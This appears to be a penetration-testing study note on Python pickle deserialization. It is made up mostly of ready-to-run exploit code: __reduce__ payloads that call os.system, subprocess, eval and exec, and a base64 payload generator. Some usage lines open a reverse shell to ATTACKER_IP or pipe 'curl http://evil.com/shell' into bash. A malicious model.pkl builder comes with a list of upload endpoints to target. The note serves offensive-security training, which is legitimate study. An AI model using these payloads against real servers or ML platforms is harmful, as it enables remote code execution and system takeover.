---
tags: [vapt, deserialization, python, intermediate]
difficulty: intermediate
module: "15 - Deserialization"
topic: "15.04 Python Pickle Deserialization"
---

# 15.04 — Python Pickle Deserialization

## What Is Pickle?

```python
# Python's built-in serialization format:
import pickle

class User:
    def __init__(self, name, role):
        self.name = name
        self.role = role

user = User("alice", "user")
serialized = pickle.dumps(user)   # → bytes object
deserialized = pickle.loads(serialized)  # → User object back

# PICKLE IS DANGEROUS BECAUSE:
# During unpickling (pickle.loads), Python executes arbitrary code
# if the object defines __reduce__() method!

# AN ATTACKER CAN CRAFT A PICKLE THAT EXECUTES ANY CODE!
```

---

## The __reduce__ RCE

```python
# __reduce__ DEFINES HOW AN OBJECT IS RECONSTRUCTED:
# Return: (callable, (args,))  → calls callable(*args) during unpickling!

import pickle, os

class RCE:
    def __reduce__(self):
        return (os.system, ("id",))  # calls os.system("id")!

payload = pickle.dumps(RCE())
# Send this payload to a server that does pickle.loads(payload)
# → os.system("id") executes on the server!

# REVERSE SHELL PAYLOAD:
class RCEShell:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
        return (os.system, (cmd,))

shell_payload = pickle.dumps(RCEShell())

# ENCODE AS BASE64 (for HTTP transport):
import base64
encoded = base64.b64encode(shell_payload).decode()
print(encoded)  # → send this as cookie/POST body
```

---

## One-Liner Pickle RCE Generator

```python
# GENERATE PICKLE PAYLOAD (save as gen_pickle.py):
import pickle, os, base64, sys

cmd = sys.argv[1] if len(sys.argv) > 1 else "id"

class Exploit(object):
    def __reduce__(self):
        return (os.system, (cmd,))

payload = pickle.dumps(Exploit())
print(base64.b64encode(payload).decode())

# USAGE:
python3 gen_pickle.py "id"
python3 gen_pickle.py "curl http://evil.com/shell | bash"
python3 gen_pickle.py "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

---

## Finding Pickle Deserialization in Apps

```bash
# LOOK FOR PYTHON APPS THAT USE PICKLE:

# COMMON PATTERNS:
# session["data"] = pickle.loads(base64.b64decode(request.cookies["session"]))
# cache.get(key) → stored with pickle → pickle.loads on retrieval
# flask-session with pickle backend
# Django cached_property sometimes uses pickle
# Machine learning APIs (model loading = pickle!)

# IDENTIFY PICKLE IN HTTP TRAFFIC:
# Binary: starts with 0x80 0x04 or 0x80 0x02 (pickle protocol 4 or 2)
# Base64: starts with "gASV..." (for protocol 4)

# DECODE AND CHECK:
python3 -c "
import pickle, base64
data = base64.b64decode('YOUR_COOKIE_VALUE')
try:
    print(pickle.loads(data))
except: 
    print('Not valid pickle')
"

# FLASK SESSION (uses pickle internally in some versions):
# Flask session cookie looks like: .eJwl...
# But flask-session with redis backend may use pickle!
```

---

## Pickle Protocol Versions

```python
# DIFFERENT PROTOCOLS PRODUCE DIFFERENT BYTES:
import pickle

class RCE:
    def __reduce__(self):
        return (__import__('os').system, ('id',))

for protocol in range(6):
    try:
        p = pickle.dumps(RCE(), protocol=protocol)
        import base64
        print(f"Protocol {protocol}: {base64.b64encode(p).decode()[:30]}...")
    except:
        pass

# Protocol 0: ASCII format (human readable opcodes)
# Protocol 1: Binary format (more compact)
# Protocol 2: Python 2.3+ (compact binary)
# Protocol 4: Python 3.4+ (default in newer Python)
# Protocol 5: Python 3.8+ (buffer protocol)

# IF SERVER REJECTS PROTOCOL 4, TRY LOWER VERSIONS:
payload = pickle.dumps(RCE(), protocol=0)  # most compatible!
```

---

## Alternative: subprocess / exec via Pickle

```python
import pickle, subprocess, base64

# USING subprocess (more reliable than os.system):
class RCE:
    def __reduce__(self):
        return (subprocess.check_output, (["id"],))

# USING eval/exec (if os not available):
class RCE2:
    def __reduce__(self):
        return (eval, ("__import__('os').system('id')",))

# USING builtins:
class RCE3:
    def __reduce__(self):
        return (
            __builtins__['exec'],
            ("import os; os.system('id')",)
        )

# ALL PRODUCE DIFFERENT PICKLE BYTES:
for cls in [RCE, RCE2, RCE3]:
    try:
        p = pickle.dumps(cls())
        print(f"{cls.__name__}: {base64.b64encode(p).decode()[:40]}")
    except:
        pass
```

---

## Machine Learning API Pickle Risk

```python
# ML MODELS ARE COMMONLY PICKLED:
# If an API allows loading user-provided models → CRITICAL!

# MALICIOUS "MODEL" FILE:
import pickle, os

class MaliciousModel:
    def __reduce__(self):
        return (os.system, ("curl http://evil.com/shell | bash",))

# Save as model.pkl:
with open('malicious_model.pkl', 'wb') as f:
    pickle.dump(MaliciousModel(), f)

# UPLOAD TO:
# - ML APIs accepting model files
# - Jupyter notebooks with file upload
# - Data science platforms
# - Any endpoint: /api/model/upload, /api/import-model

# REAL WORLD:
# Many ML libraries load models with pickle:
# sklearn.externals.joblib.load()
# torch.load() (with map_location)
# keras.models.load_model() (custom objects)
```

---

## Related Notes
- [[01 - What is Serialization and Deserialization]] — fundamentals
- [[09 - YAML Deserialization]] — YAML also dangerous in Python (PyYAML)
- [[12 - Defense Avoid Untrusted Deserialization]] — defense (use json not pickle)
